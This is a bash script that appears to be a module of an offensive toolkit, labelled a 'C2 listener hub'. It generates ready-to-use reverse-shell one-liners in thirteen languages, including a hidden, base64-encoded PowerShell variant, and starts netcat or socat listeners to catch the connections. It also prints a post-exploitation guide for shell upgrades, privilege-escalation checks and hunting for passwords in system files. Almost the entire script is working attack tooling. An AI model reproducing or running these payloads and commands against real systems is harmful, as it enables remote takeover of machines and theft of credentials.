#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "C2 LISTENER HUB" "payload generator · reverse shell catcher · PTY upgrade"

# ── Config ────────────────────────────────────────────────────────────────────
LHOST="$(get_ip)"
LPORT=4444
_PID_FILE="/tmp/.fsec_c2_$$"

# ── Tool check ────────────────────────────────────────────────────────────────
_HAS_SOCAT=0; _HAS_NC=0
check_tool socat && _HAS_SOCAT=1 || true
check_tool nc    && _HAS_NC=1    || true

_show_config() {
  printf '  %s[SYS]%s LHOST    : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$LHOST" "${RESET}"
  printf '  %s[SYS]%s LPORT    : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$LPORT" "${RESET}"
  if [[ $_HAS_SOCAT -eq 1 ]]; then
    printf '  %s[SYS]%s Listener : %ssocat  (full PTY)%s\n' "${CYAN}" "${RESET}" "${GREEN}" "${RESET}"
  elif [[ $_HAS_NC -eq 1 ]]; then
    printf '  %s[SYS]%s Listener : %snc  (dumb — upgrade needed)%s\n' "${CYAN}" "${RESET}" "${YELLOW}" "${RESET}"
  else
    printf '  %s[SYS]%s Listener : %snone — apt install socat%s\n' "${CYAN}" "${RESET}" "${RED}" "${RESET}"
  fi
  printf '\n'
}

# ── LHOST / LPORT setters ─────────────────────────────────────────────────────
_set_lhost() {
  printf '  %s>>%s LHOST [%s]: ' "${CYAN}" "${RESET}" "$LHOST"
  read -r _in  || _in=""
  [[ -n "${_in:-}" ]] && LHOST="$_in"
  _show_config
}

_set_lport() {
  printf '  %s>>%s LPORT [%s]: ' "${CYAN}" "${RESET}" "$LPORT"
  read -r _in  || _in=""
  [[ -n "${_in:-}" && "$_in" =~ ^[0-9]+$ ]] && LPORT="$_in"
  _show_config
}

# ── Payload generator ─────────────────────────────────────────────────────────
_payloads() {
  local H="$LHOST" P="$LPORT"

  printf '\n  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
  printf '  %s│  PAYLOAD TYPE                                    │%s\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s── Linux / Unix ────────────────────────────────────%s\n' "${DIM}" "${RESET}"
  printf '  %s[01]%s Bash -i          (most universal)\n'   "${CYAN}" "${RESET}"
  printf '  %s[02]%s Bash fd 196      (alternative)\n'      "${CYAN}" "${RESET}"
  printf '  %s[03]%s Python 3\n'                             "${CYAN}" "${RESET}"
  printf '  %s[04]%s Python 2\n'                             "${CYAN}" "${RESET}"
  printf '  %s[05]%s PHP\n'                                  "${CYAN}" "${RESET}"
  printf '  %s[06]%s Perl\n'                                 "${CYAN}" "${RESET}"
  printf '  %s[07]%s Netcat  (with -e)\n'                   "${CYAN}" "${RESET}"
  printf '  %s[08]%s Netcat  (mkfifo — no -e)\n'            "${CYAN}" "${RESET}"
  printf '  %s[09]%s Ruby\n'                                 "${CYAN}" "${RESET}"
  printf '  %s[10]%s Socat   (full PTY — best)\n'           "${CYAN}" "${RESET}"
  printf '  %s[11]%s AWK\n'                                  "${CYAN}" "${RESET}"
  printf '  %s── Windows ──────────────────────────────────────────%s\n' "${DIM}" "${RESET}"
  printf '  %s[12]%s PowerShell\n'                           "${CYAN}" "${RESET}"
  printf '  %s[13]%s PowerShell (base64 encoded)\n'         "${CYAN}" "${RESET}"
  printf '  %s── All ──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"
  printf '  %s[00]%s Show all\n'                             "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s>>%s ' "${CYAN}" "${RESET}"
  read -r _pick  || _pick="0"
  printf '\n'

  _pp() {
    printf '  %s┌─ %s%s\n'                                   "${CYAN}" "$1" "${RESET}"
    printf '  %s│%s %s%s%s\n'                                "${CYAN}" "${RESET}" "${GREEN}" "$2" "${RESET}"
    printf '  %s└─────────────────────────────────────────────%s\n\n' "${CYAN}" "${RESET}"
  }

  local _bash_i="bash -i >& /dev/tcp/${H}/${P} 0>&1"
  local _bash_196="0<&196;exec 196<>/dev/tcp/${H}/${P}; sh <&196 >&196 2>&196"
  local _py3="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${H}\",${P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  local _py2="python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${H}\",${P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  local _php="php -r '\$s=fsockopen(\"${H}\",${P});\$p=proc_open(\"/bin/sh -i\",array(0=>\$s,1=>\$s,2=>\$s),\$x);'"
  local _perl="perl -e 'use Socket;\$i=\"${H}\";\$p=${P};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
  local _nc_e="nc -e /bin/sh ${H} ${P}"
  local _nc_mk="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${H} ${P} >/tmp/f"
  local _ruby="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${H}\",\"${P}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
  local _socat="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${H}:${P}"
  local _awk="awk 'BEGIN{s=\"/inet/tcp/0/${H}/${P}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
  local _ps="powershell -nop -w hidden -c \"\$c=New-Object Net.Sockets.TCPClient('${H}',${P});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$x=\$r+'PS '+(pwd).Path+'> ';\$y=[System.Text.Encoding]::ASCII.GetBytes(\$x);\$s.Write(\$y,0,\$y.Length)}\""

  local _ps_raw="\$c=New-Object Net.Sockets.TCPClient('${H}',${P});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$x=\$r+'PS '+(pwd).Path+'> ';\$y=[System.Text.Encoding]::ASCII.GetBytes(\$x);\$s.Write(\$y,0,\$y.Length)}"
  local _enc
  _enc=$(printf '%s' "$_ps_raw" | iconv -f UTF-8 -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "")
  local _ps_enc
  if [[ -n "${_enc:-}" ]]; then
    _ps_enc="powershell -nop -w hidden -enc ${_enc}"
  else
    _ps_enc="(iconv/base64 unavailable — encode manually with: printf 'PAYLOAD' | iconv -t UTF-16LE | base64 -w0)"
  fi

  case "${_pick:-0}" in
    1)  _pp "Bash -i"              "$_bash_i" ;;
    2)  _pp "Bash fd 196"          "$_bash_196" ;;
    3)  _pp "Python 3"             "$_py3" ;;
    4)  _pp "Python 2"             "$_py2" ;;
    5)  _pp "PHP"                  "$_php" ;;
    6)  _pp "Perl"                 "$_perl" ;;
    7)  _pp "Netcat (-e)"          "$_nc_e" ;;
    8)  _pp "Netcat (mkfifo)"      "$_nc_mk" ;;
    9)  _pp "Ruby"                 "$_ruby" ;;
    10) _pp "Socat PTY"            "$_socat" ;;
    11) _pp "AWK"                  "$_awk" ;;
    12) _pp "PowerShell"           "$_ps" ;;
    13) _pp "PowerShell (encoded)" "$_ps_enc" ;;
    *)
      _pp "Bash -i"              "$_bash_i"
      _pp "Bash fd 196"          "$_bash_196"
      _pp "Python 3"             "$_py3"
      _pp "Python 2"             "$_py2"
      _pp "PHP"                  "$_php"
      _pp "Perl"                 "$_perl"
      _pp "Netcat (-e)"          "$_nc_e"
      _pp "Netcat (mkfifo)"      "$_nc_mk"
      _pp "Ruby"                 "$_ruby"
      _pp "Socat PTY"            "$_socat"
      _pp "AWK"                  "$_awk"
      _pp "PowerShell"           "$_ps"
      _pp "PowerShell (encoded)" "$_ps_enc"
      ;;
  esac
}

# ── Foreground listener ───────────────────────────────────────────────────────
_start_listener() {
  printf '  %s>>%s Port [%s]: ' "${CYAN}" "${RESET}" "$LPORT"
  read -r _p  || _p=""
  [[ -n "${_p:-}" && "$_p" =~ ^[0-9]+$ ]] && LPORT="$_p"
  printf '\n'

  if [[ $_HAS_SOCAT -eq 1 ]]; then
    printf '  %s[✔]%s socat PTY listener  — port %s%s%s\n' "${GREEN}" "${RESET}" "${CYAN}" "$LPORT" "${RESET}"
    printf '  %s[SYS]%s Run on target for instant full PTY:\n' "${CYAN}" "${RESET}"
    printf '  %s      socat exec:'"'"'bash -li'"'"',pty,stderr,setsid,sigint,sane tcp:%s:%s%s\n\n' \
      "${GREEN}" "$LHOST" "$LPORT" "${RESET}"
    printf '  %s[*]%s Waiting for connection...%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
    socat file:"$(tty)",raw,echo=0 tcp-listen:"$LPORT",reuseaddr
  elif [[ $_HAS_NC -eq 1 ]]; then
    printf '  %s[~]%s socat not found — nc listener on port %s%s%s\n' "${YELLOW}" "${RESET}" "${CYAN}" "$LPORT" "${RESET}"
    printf '  %s[SYS]%s Once connected, upgrade PTY:\n' "${CYAN}" "${RESET}"
    printf '  %s      python3 -c '"'"'import pty;pty.spawn("/bin/bash")'"'"'%s\n' "${GREEN}" "${RESET}"
    printf '  %s      Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm%s\n\n' "${GREEN}" "${RESET}"
    printf '  %s[*]%s Waiting for connection...%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
    nc -lvnp "$LPORT"
  else
    printf '  %s[!]%s No listener available — install socat or netcat:%s\n' "${RED}" "${RESET}" "${RESET}"
    printf '      apt install socat netcat-traditional\n\n'
  fi
}

# ── Background listener ───────────────────────────────────────────────────────
_bg_listener() {
  if [[ $_HAS_NC -eq 0 ]]; then
    printf '  %s[!]%s nc not found — apt install netcat-traditional%s\n\n' "${RED}" "${RESET}" "${RESET}"
    return 1
  fi
  printf '  %s>>%s Port [%s]: ' "${CYAN}" "${RESET}" "$LPORT"
  read -r _p  || _p=""
  [[ -n "${_p:-}" && "$_p" =~ ^[0-9]+$ ]] && LPORT="$_p"

  nc -lvnp "$LPORT" &
  local _pid=$!
  printf '%s %s\n' "$LPORT" "$_pid" >> "$_PID_FILE"
  printf '\n  %s[✔]%s Background listener — port %s%s%s  PID %s%s%s\n\n' \
    "${GREEN}" "${RESET}" "${CYAN}" "$LPORT" "${RESET}" "${DIM}" "$_pid" "${RESET}"
}

# ── Session management ────────────────────────────────────────────────────────
_show_sessions() {
  printf '\n  %s[*]%s Background listeners this session:\n\n' "${CYAN}" "${RESET}"
  if [[ ! -s "${_PID_FILE:-/dev/null}" ]]; then
    printf '  %s[~]%s None started%s\n\n' "${DIM}" "${RESET}" "${RESET}"
    return
  fi
  while IFS=' ' read -r _port _pid; do
    [[ -z "${_port:-}" || -z "${_pid:-}" ]] && continue
    if kill -0 "$_pid" 2>/dev/null; then
      printf '  %s[✔]%s :%s  PID %s%s%s\n' "${GREEN}" "${RESET}" "$_port" "${CYAN}" "$_pid" "${RESET}"
    else
      printf '  %s[✘]%s :%s  PID %s%s%s  (dead)\n' "${DIM}" "${RESET}" "$_port" "${DIM}" "$_pid" "${RESET}"
    fi
  done < "$_PID_FILE"
  printf '\n'
}

_kill_session() {
  _show_sessions
  [[ ! -s "${_PID_FILE:-/dev/null}" ]] && return
  printf '  %s>>%s PID to kill (Enter to cancel): ' "${CYAN}" "${RESET}"
  read -r _pid  || return
  [[ -z "${_pid:-}" ]] && return
  if kill "$_pid" 2>/dev/null; then
    printf '  %s[✔]%s PID %s killed%s\n\n' "${GREEN}" "${RESET}" "$_pid" "${RESET}"
  else
    printf '  %s[!]%s Could not kill PID %s%s\n\n' "${YELLOW}" "${RESET}" "$_pid" "${RESET}"
  fi
}

# ── PTY upgrade + post-shell guide ────────────────────────────────────────────
_pty_guide() {
  section "PTY UPGRADE"

  printf '\n  %s▶ Method 1 — Python pty (universal)%s\n\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s[target]%s python3 -c '"'"'import pty;pty.spawn("/bin/bash")'"'"'\n' "${DIM}" "${RESET}"
  printf '  %s[phone] %s Ctrl+Z\n' "${DIM}" "${RESET}"
  printf '  %s[phone] %s stty raw -echo; fg%s\n' "${DIM}" "${RESET}" "${RESET}"
  printf '  %s[target]%s export TERM=xterm SHELL=bash%s\n\n' "${DIM}" "${RESET}" "${RESET}"

  printf '  %s▶ Method 2 — socat full PTY (best quality)%s\n\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s[phone]  socat file:$(tty),raw,echo=0 tcp-listen:%s,reuseaddr%s\n' "${GREEN}" "$LPORT" "${RESET}"
  printf '  %s[target] socat exec:'"'"'bash -li'"'"',pty,stderr,setsid,sigint,sane tcp:%s:%s%s\n\n' \
    "${GREEN}" "$LHOST" "$LPORT" "${RESET}"

  printf '  %s▶ Method 3 — script (no Python on target)%s\n\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s[target] script /dev/null -c bash%s\n\n' "${GREEN}" "${RESET}"

  section "POST-SHELL RECON"
  printf '\n  %s# Basic info%s\n' "${DIM}" "${RESET}"
  printf '  %s  id; whoami; hostname; ip a%s\n' "${GREEN}" "${RESET}"
  printf '  %s  uname -a; cat /proc/version%s\n\n' "${GREEN}" "${RESET}"
  printf '  %s# Privesc surface%s\n' "${DIM}" "${RESET}"
  printf '  %s  sudo -l%s\n' "${GREEN}" "${RESET}"
  printf '  %s  find / -perm -4000 2>/dev/null       # SUID binaries%s\n' "${GREEN}" "${RESET}"
  printf '  %s  cat /etc/crontab 2>/dev/null%s\n' "${GREEN}" "${RESET}"
  printf '  %s  env; cat ~/.bash_history 2>/dev/null%s\n\n' "${GREEN}" "${RESET}"
  printf '  %s# Credential hunting%s\n' "${DIM}" "${RESET}"
  printf '  %s  cat /etc/passwd | grep -v nologin%s\n' "${GREEN}" "${RESET}"
  printf '  %s  grep -r "password" /etc/ 2>/dev/null | grep -v Binary%s\n' "${GREEN}" "${RESET}"
  printf '  %s  find / -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l password%s\n\n' "${GREEN}" "${RESET}"
}

# ── Main menu ─────────────────────────────────────────────────────────────────
_menu() {
  printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
  printf '  %s│  C2 CONTROL                                      │%s\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s[01]%s ▶  Payloads       reverse shell one-liners (13 types)\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s ▶  Listen         foreground listener (interactive shell)\n' "${CYAN}" "${RESET}"
  printf '  %s[03]%s ▶  Listen BG      background nc listener\n'               "${CYAN}" "${RESET}"
  printf '  %s[04]%s ▶  Sessions       list background listeners\n'             "${CYAN}" "${RESET}"
  printf '  %s[05]%s ▶  Kill           stop a background listener\n'            "${CYAN}" "${RESET}"
  printf '  %s[06]%s ▶  PTY guide      shell upgrade + post-shell commands\n'   "${CYAN}" "${RESET}"
  printf '  %s[07]%s ▶  Set LHOST      current: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$LHOST" "${RESET}"
  printf '  %s[08]%s ▶  Set LPORT      current: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$LPORT" "${RESET}"
  printf '  %s[00]%s ▶  Exit\n' "${RED}" "${RESET}"
  printf '\n'
}

# ── Cleanup ───────────────────────────────────────────────────────────────────
trap 'rm -f "$_PID_FILE" 2>/dev/null; printf "\n  %s[!] C2 session closed.%s\n\n" "${RED}" "${RESET}"' EXIT INT

_show_config

# ── Pipeline auto-mode ─────────────────────────────────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  outdir="$(make_outdir)"
  outfile="$outdir/c2.txt"
  : > "$outfile"

  {
    printf '=== C2 AUTO-MODE ===\n'
    printf 'LHOST : %s\n' "$LHOST"
    printf 'LPORT : %s\n\n' "$LPORT"
    printf '=== REVERSE SHELL PAYLOADS ===\n\n'
    printf '[bash-i]   bash -i >& /dev/tcp/%s/%s 0>&1\n\n' "$LHOST" "$LPORT"
    printf '[python3]  python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'\n\n' "$LHOST" "$LPORT"
    printf '[php]      php -r '"'"'$s=fsockopen("%s",%s);$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$x);'"'"'\n\n' "$LHOST" "$LPORT"
    printf '[nc-mkfifo] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n\n' "$LHOST" "$LPORT"
    printf '[socat]    socat exec:'"'"'bash -li'"'"',pty,stderr,setsid,sigint,sane tcp:%s:%s\n\n' "$LHOST" "$LPORT"
    printf '[powershell] powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('"'"'%s'"'"',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=$r+'"'"'PS '"'"'+(pwd).Path+'"'"'> '"'"';$y=[System.Text.Encoding]::ASCII.GetBytes($x);$s.Write($y,0,$y.Length)}"\n\n' "$LHOST" "$LPORT"
  } >> "$outfile"

  # Start background listener
  if [[ $_HAS_NC -eq 1 ]]; then
    nc -lvnp "$LPORT" >> "$outfile" 2>&1 &
    _bg_pid=$!
    printf '  %s[CHAIN]%s nc listener started on %s:%s (PID %s)\n' \
      "${CYAN}" "${RESET}" "$LHOST" "$LPORT" "$_bg_pid"
    printf '# nc listener PID %s — port %s\n' "$_bg_pid" "$LPORT" >> "$outfile"
  elif [[ $_HAS_SOCAT -eq 1 ]]; then
    socat tcp-listen:"$LPORT",reuseaddr,fork - >> "$outfile" 2>&1 &
    _bg_pid=$!
    printf '  %s[CHAIN]%s socat listener started on %s:%s (PID %s)\n' \
      "${CYAN}" "${RESET}" "$LHOST" "$LPORT" "$_bg_pid"
    printf '# socat listener PID %s — port %s\n' "$_bg_pid" "$LPORT" >> "$outfile"
  else
    printf '  %s[!]%s No listener tool — payloads written to: %s\n' \
      "${RED}" "${RESET}" "$outfile"
  fi

  mark_done "$outfile"
  exit 0
fi

while true; do
  _menu
  printf '  %s>>%s ' "${CYAN}" "${RESET}"
  read -r _choice  || break
  echo

  case "${_choice:-}" in
    1) _payloads ;;
    2) _start_listener ;;
    3) _bg_listener ;;
    4) _show_sessions ;;
    5) _kill_session ;;
    6) _pty_guide ;;
    7) _set_lhost ;;
    8) _set_lport ;;
    0) break ;;
    *) printf '  %s[!] Invalid option — enter 00-08%s\n\n' "${YELLOW}" "${RESET}" ;;
  esac

  printf '  %s▶%s Press Enter to continue...' "${DIM}" "${RESET}"
  read -r _  || true
  printf '\n'
done
